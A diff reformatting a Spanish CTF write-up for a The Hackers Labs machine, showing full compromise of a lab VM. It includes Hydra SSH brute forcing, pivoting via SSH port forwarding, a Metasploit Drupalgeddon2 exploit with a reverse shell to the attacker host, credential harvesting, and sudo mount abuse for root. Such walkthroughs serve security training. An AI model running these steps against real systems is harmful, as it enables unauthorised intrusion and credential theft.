@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Pa Que Aiga Lujo
+---
+icon: linux
+---
 
-**Plataforma:** The Hackers Labs  
-**Sistema Operativo:** Linux  
+# Pa Que Aiga Lujo ​​
+
+## 🖥️ Writeup - Pa Que Aiga Lujo
+
+**Plataforma:** The Hackers Labs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Hydra` `Docker` `Pivoting` `Drupal` `Metasploit` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el archivo `zip` que contiene la `.ova` de la máquina Pa Que Aiga Lujo, lo extraemos y la importamos en VirtualBox.
 
 Configuramos la interfaz de red de la máquina Pa Que Aiga Lujo y la iniciamos junto a nuestra máquina atacante.
 
-# RECONOCIMIENTO DE HOSTS
+## RECONOCIMIENTO DE HOSTS
 
 En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,23 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:6f:3d:92      1      60  PCS Systemtechnik GmbH      
  10.0.4.91       08:00:27:80:8c:91      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 Identificamos con seguridad que la `IP` de la víctima es `10.0.4.91`.
 
-# ESCANEO DE PUERTOS    
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.91
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.91
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-10 20:55 +0100
 Nmap scan report for 10.0.4.91
@@ -69,11 +78,12 @@ Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
 
 Identificamos los puertos `22` (SSH) y `80` (HTTP) abiertos.
 
-Accedemos al servicio web y nos encontramos con una tienda de artículos de lujo. 
+Accedemos al servicio web y nos encontramos con una tienda de artículos de lujo.
 
 Tras inspeccionar la página, recopilamos una `lista de nombres` propios que aparecen en ella para generar un diccionario de posibles usuarios.
 
 users.txt:
+
 ```
 Carlos
 Isabella
@@ -92,15 +102,16 @@ Priscilla
 Beatrice
 ```
 
-# FUERZA BRUTA (SSH)
+## FUERZA BRUTA (SSH)
 
 Con la lista de usuarios generada, procedemos a realizar un ataque de `fuerza bruta` contra el servicio `SSH` utilizando `Hydra` y el diccionario `rockyou.txt`.
 
-```Bash
+```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.0.4.91 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -116,19 +127,20 @@ Encontramos credenciales válidas para la usuaria `Sophia` : `dolphins`.
 
 Accedemos al sistema.
 
-```Bash
+```bash
 ssh Sophia@10.0.4.91
 ```
 
-# RECONOCIMIENTO INTERNO
+## RECONOCIMIENTO INTERNO
 
 Una vez dentro, enumeramos los usuarios del sistema y detectamos la presencia de un usuario llamado `cipote`.
 
-```Bash
+```bash
 cat /etc/passwd | grep sh$
 ```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
@@ -138,11 +150,12 @@ cipote:x:1002:1002:,,,:/home/cipote:/bin/bash
 
 Analizamos las interfaces de red para identificar si estamos conectados a otras subredes.
 
-```Bash
+```bash
 ip a
 ```
 
 Info:
+
 ```
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -172,11 +185,12 @@ Identificamos una interfaz `docker0` con la IP `172.17.0.1`. Esto sugiere que ha
 
 Realizamos un `Ping Sweep` para descubrir otros hosts activos en la subred `172.17.0.0/16`.
 
-```Bash
+```bash
 for i in {1..254} ;do (ping -c 1 172.17.0.$i | grep "bytes from" &) ;done
 ```
 
 Info:
+
 ```
 64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.034 ms
 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.025 ms
@@ -187,16 +201,19 @@ Detectamos un `host` activo en `172.17.0.2`.
 Para escanear este host interno cómodamente, transferimos la herramienta `fscan` desde nuestra máquina atacante a la máquina víctima.
 
 En nuestra máquina atacante:
-```Bash
+
+```bash
 python3 -m http.server 80
 ```
 
 En la máquina víctima (dentro de `/tmp`):
-```Bash
+
+```bash
 wget http://10.0.4.12/fscan .
 ```
 
 Info:
+
 ```
 --2026-02-10 21:22:22--  http://10.0.4.12/fscan
 Conectando con 10.0.4.12:80... conectado.
@@ -217,6 +234,7 @@ chmod +x fscan
 ```
 
 Info:
+
 ```
    ___                              _    
   / _ \     ___  ___ _ __ __ _  ___| | __ 
@@ -236,29 +254,30 @@ start vulscan
 
 El escaneo revela que el host `172.17.0.2` tiene el puerto `80` abierto y corre un `Drupal 8` vulnerable a `CVE-2018-7600` (Drupalgeddon2).
 
-# PIVOTING Y EXPLOTACIÓN
+## PIVOTING Y EXPLOTACIÓN
 
 Para explotar esta vulnerabilidad desde nuestra máquina atacante, realizamos un `Local Port Forwarding` a través de la sesión `SSH` de Sophia.
 
-```Bash
+```bash
 ssh -L 8080:172.17.0.2:80 Sophia@10.0.4.91
 ```
 
 Ahora, el servicio `Drupal` interno es accesible desde nuestro `localhost:8080`.
 
-![alt text](../../images/drupalpiv.png)
+![alt text](../../.gitbook/assets/drupalpiv.png)
 
 Lanzamos `Metasploit` para explotar la vulnerabilidad.
 
-```Bash
+```bash
 msfconsole
 use exploit/unix/webapp/drupal_drupalgeddon2
 set RHOSTS localhost
 set RPORT 8080
 run
-``` 
+```
 
 Info:
+
 ```
 [*] Exploiting target 127.0.0.1
 [*] Started reverse TCP handler on 10.0.4.12:4444 
@@ -274,42 +293,44 @@ meterpreter >
 
 ¡Tenemos sesión de `Meterpreter` en el contenedor como usuario `www-data`!
 
-# MOVIMIENTO LATERAL (CONTENEDOR)
+## MOVIMIENTO LATERAL (CONTENEDOR)
 
 Dentro del contenedor, buscamos credenciales o información sensible. Enumeramos los archivos de configuración de `Drupal`.
 
-```Bash
+```bash
 grep -r "password" /var/www/html/sites/default/settings.php
 ```
 
 Info:
+
 ```
  * to replace the database username and password and possibly the host and port
  * 'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 ```
 
-Encontramos una contraseña: `ballenitafeliz`. 
+Encontramos una contraseña: `ballenitafeliz`.
 
 Comprobamos el archivo `/etc/passwd` y vemos que existe un usuario llamado `ballenita`.
 
 Mejoramos la shell y migramos a ese usuario.
 
-```Bash
+```bash
 shell
 /bin/bash -i
 script -qc /bin/bash /dev/null 
 su ballenita
 ```
 
-# ESCALADA DE PRIVILEGIOS (CONTENEDOR)
+## ESCALADA DE PRIVILEGIOS (CONTENEDOR)
 
 Comprobamos los permisos `sudo` del usuario `ballenita`.
 
-```Bash
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for ballenita on 76f1a1515e36:
     env_reset, mail_badpass,
@@ -321,11 +342,12 @@ User ballenita may run the following commands on 76f1a1515e36:
 
 Podemos ejecutar `ls` y `grep` como `root` sin contraseña. Aprovechamos esto para listar el directorio `/root` y leer archivos sensibles.
 
-```Bash
+```bash
 sudo -u root /bin/ls -la /root
 ```
 
 Info:
+
 ```
 total 36
 drwx------ 1 root root 4096 Aug 10  2025 .
@@ -338,34 +360,36 @@ drwxr-xr-x 2 root root 4096 Oct 16  2024 .nano
 -rw-r--r-- 1 root root   36 Aug 10  2025 secretitomaximo.txt
 ```
 
-```Bash
+```bash
 sudo -u root /bin/grep '' /root/secretitomaximo.txt
 ```
 
 Info:
+
 ```
 ElcipotedeChocolate-CipotitoCipoton
 ```
 
 Hemos obtenido lo que parece ser la contraseña para el usuario `cipote` de la máquina anfitriona.
 
-Cerramos la conexión con el contenedor y volvemos a la máquina principal `10.0.4.91`. 
+Cerramos la conexión con el contenedor y volvemos a la máquina principal `10.0.4.91`.
 
 Usamos la contraseña obtenida para acceder como `cipote`.
 
-```Bash
+```bash
 ssh cipote@10.0.4.91
 ```
 
-# ESCALADA DE PRIVILEGIOS (HOST)
+## ESCALADA DE PRIVILEGIOS (HOST)
 
 Comprobamos permisos `sudo`.
 
-```Bash
+```bash
 sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for cipote on TheHackersLabs-PaQueAigaLujo:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -374,16 +398,17 @@ User cipote may run the following commands on TheHackersLabs-PaQueAigaLujo:
     (ALL) NOPASSWD: /usr/bin/mount
 ```
 
-Podemos ejecutar `/usr/bin/mount` como `root`. 
+Podemos ejecutar `/usr/bin/mount` como `root`.
 
 Consultando `GTFOBins`, vemos que podemos usar este comando para montar `/bin/bash` sobre `/bin/mount` y obtener una shell de `root` al ejecutarlo.
 
-```Bash
+```bash
 sudo /usr/bin/mount -o bind /bin/bash /bin/mount
 sudo mount
 ```
 
 Info:
+
 ```
 root@TheHackersLabs-PaQueAigaLujo:/home/cipote# whoami
 root
